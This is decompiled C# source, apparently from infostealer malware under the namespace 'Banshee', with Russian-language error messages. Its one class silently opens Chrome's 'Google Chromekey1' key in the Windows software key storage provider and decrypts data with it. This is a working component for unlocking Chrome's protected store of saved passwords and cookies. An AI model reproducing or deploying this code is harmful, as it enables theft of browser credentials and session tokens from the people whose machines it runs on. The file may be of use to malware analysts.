﻿using System;

namespace Banshee.Helper.Encrypted
{
	// Token: 0x020000DF RID: 223
	public static class CngDecryptor
	{
		// Token: 0x060002EB RID: 747 RVA: 0x000171B0 File Offset: 0x000171B0
		public static byte[] Decrypt(byte[] inputData, string providerName = "Microsoft Software Key Storage Provider", string keyName = "Google Chromekey1")
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			byte[] result;
			try
			{
				int num = NativeMethods.NCryptOpenStorageProvider(out zero, providerName, 0);
				if (num != 0)
				{
					throw new Exception(string.Format("Ошибка NCryptOpenStorageProvider: Код {0}", num));
				}
				num = NativeMethods.NCryptOpenKey(zero, out zero2, keyName, 0, 0);
				if (num != 0)
				{
					throw new Exception(string.Format("Ошибка NCryptOpenKey: Код {0}", num));
				}
				int num2;
				num = NativeMethods.NCryptDecrypt(zero2, inputData, inputData.Length, IntPtr.Zero, null, 0, out num2, 64);
				if (num != 0)
				{
					throw new Exception(string.Format("Ошибка определения размера NCryptDecrypt: Код {0}", num));
				}
				byte[] array = new byte[num2];
				num = NativeMethods.NCryptDecrypt(zero2, inputData, inputData.Length, IntPtr.Zero, array, array.Length, out num2, 64);
				if (num != 0)
				{
					throw new Exception(string.Format("Ошибка NCryptDecrypt: Код {0}", num));
				}
				Array.Resize<byte>(ref array, num2);
				result = array;
			}
			finally
			{
				if (zero2 != IntPtr.Zero)
				{
					NativeMethods.NCryptFreeObject(zero2);
				}
				if (zero != IntPtr.Zero)
				{
					NativeMethods.NCryptFreeObject(zero);
				}
			}
			return result;
		}

		// Token: 0x04000245 RID: 581
		private const int NCRYPT_SILENT_FLAG = 64;
	}
}
